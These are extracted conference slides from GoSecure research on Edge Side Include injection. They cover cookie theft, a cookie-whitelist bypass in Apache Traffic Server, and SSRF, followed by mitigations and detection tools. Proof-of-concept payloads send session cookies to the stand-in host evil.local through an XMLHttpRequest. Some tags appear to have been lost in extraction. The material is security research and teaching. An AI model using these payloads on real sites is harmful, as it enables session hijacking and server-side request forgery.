Edge Side Include Injection
Abusing Caching Servers into SSRF and Transparent Session 
Hijacking
By Louis Dion-Marcil
GoSecure
Edge Side Includes (ESI)… what is it?
Edge Side Includes (ESI)… what is it?
Edge Side Includes (ESI)… what is it?
The Weather Website
Forecast for
Monday
Tuesday
Wednesday
Montréal
27°C
23°C
31°C
Edge Side Includes (ESI)… what is it?
The Weather Website
Forecast for
Monday
Tuesday
Wednesday
Montréal
27°C
23°C
31°C
Variable Fragments
Static Fragment
Edge Side Includes (ESI)… what is it?
❖ Adds fragmentation to caching
❖ App Server send fragment markers in HTTP responses
❖ ESI tags are parsed by the HTTP surrogate (load balancer, proxy)
❖ Most engines require specific App Server HTTP Headers
ESI Features & Syntax — Include
page-1.html:
  This is page 1!
page-2.html:
  This is page 2!
ESI Features & Syntax — Include
$ curl -s http://esi/page-1.html
  This is page 1!
  This is page 2!
ESI Flow (cache miss)
ESI Flow (cache miss)
①/1.html
ESI Flow (cache miss)
①/1.html
②/1.html
ESI Flow (cache miss)
①/1.html
1.html + ESI
②/1.html
③
ESI Flow (cache miss)
①/1.html
1.html + ESI
②/1.html
③
ESI tags 
processed
ESI Flow (cache miss)
①/1.html
1.html + ESI
②/1.html
③
④/2.html
ESI tags 
processed
ESI Flow (cache miss)
①/1.html
1.html + ESI
②/1.html
③
④/2.html
2.html
⑤
ESI tags 
processed
ESI Flow (cache miss)
①/1.html
1.html + ESI
②/1.html
③
④/2.html
2.html
⑤
⑥
+
ESI tags 
processed
ESI Features & Syntax — Variables
$(VARIABLE_NAME)
ESI Features & Syntax — Variables
$(VARIABLE_NAME)
$(HTTP_USER_AGENT)
→  Mozilla/5.0 (X11;[…]
$(QUERY_STRING)
→  city=Montreal&format=C
$(HTTP_COOKIE)
→  _ga=[…]&__utma=[…]
ESI Attacks
❖ ESI tags are sent by the application server
❖ How can the Edge server tell which tags are legitimate?
❖ It can’t.
ESI Injection
  City: 
ESI Injection
  City: 
  City: $(HTTP_COOKIE{PHPSESSID})
ESI Injection
  City: 
  City: $(HTTP_COOKIE{PHPSESSID})
ESI Implementations — Apache Traffic Server
❖ Donated by Yahoo! to Apache
❖ ESI stack implemented, with bonus features
❖ Used by Yahoo, Apple
ESI Implementations — Apache Traffic Server
❖ Offers Cookie whitelisting
❖ Critical cookies not accessible by ESI... or are they?
$(HTTP_COOKIE{PHPSESSID}) ❌
ESI Implementations — Apache Traffic Server
❖ Offers Cookie whitelisting
❖ Critical cookies not accessible by ESI... or are they?
$(HTTP_COOKIE{PHPSESSID}) ❌
$(HTTP_HEADER{Cookie}) 
✅
ESI Implementations — Apache Traffic Server
❖ Offers Cookie whitelisting
❖ Critical cookies not accessible by ESI... or are they?
$(HTTP_COOKIE{PHPSESSID}) ❌
$(HTTP_HEADER{Cookie}) 
✅
→ "_ga=[…]&PHPSESSID=b9gcvscc[…]"
DEMO — Proof of concept
$(HTTP_HEADER{Cookie})
">
DEMO — Proof of concept
$(HTTP_HEADER{Cookie})
">
DEMO — Proof of concept
DEMO — Proof of concept
http://evil.local/username=attacker;session_cookie=s%3A...
Internet
DEMO
Now we know...
❖ … we can inject ESI tags,
❖ … we can leak sensitive cookies.
ESI Implementations — Oracle Web Cache (for WebLogic)
❖ Part of the 11g suite
❖ Usually serves WebLogic Application Servers
❖ Initial ESI specification implemented, plus features
DEMO — Proof of concept
   var x = new XMLHttpRequest();
  x.open("GET", "//evil.local/?
    $(HTTP_COOKIE{session_cookie})");
   x.send();
DEMO — Proof of concept
   var x = new XMLHttpRequest();
  x.open("GET", "//evil.local/?
    $(HTTP_COOKIE{session_cookie})");
   x.send();
DEMO — Proof of concept
   var x = new XMLHttpRequest();
  x.open("GET", "//evil.local/?lHKlM77VbP79hDnMX2Gg...");
   x.send();
DEMO — Proof of concept
http://evil.local/?lHKlM77VbP79hDnMX2Gg...
Internet
ESI - Mitigations
❖ Escaping!
{
  "first_name": "Louis",
  "last_name": ""
}
ESI - Mitigations
❖ Escaping!
{
  "first_name": "Louis",
  "last_name": ""
}
Invalid ESI tag!
ESI - Mitigations
❖ Escaping! Encoding!
{
  "first_name": "Louis",
  "last_name": ""
}
❖ Escaping? Encoding?This is valid with Apache Traffic Server…
{
  "first_name": "Louis",
  "last_name": ""
}
Invalid ESI tag!
SSRF with Apache Traffic Server
SSRF with Apache Traffic Server
SSRF with Apache Traffic Server
ESI — SSRF Flow 
①/api/me
/api/me + ESI
②/api/me
③
④/server-status
server-status
⑤
⑥
+
ESI tags 
processed
ESI — Manual Detection
FOOBAR
→
FOOBAR
✅
FOOBAR
→
FOOBAR
❌
ESI — Automatic Detection
❖ Burp ActiveScan++
❖ Burp Upload Scanner
❖ Acunetix
ESI - Migration
❖ Cloudflare Workers
https://gist.github.com/Overbryd/c070bb1fa769609d404f648c
d506340f 
Questions?
Detailed blogpost of our prior research:
https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/ 
By Louis Dion-Marcil
GoSecure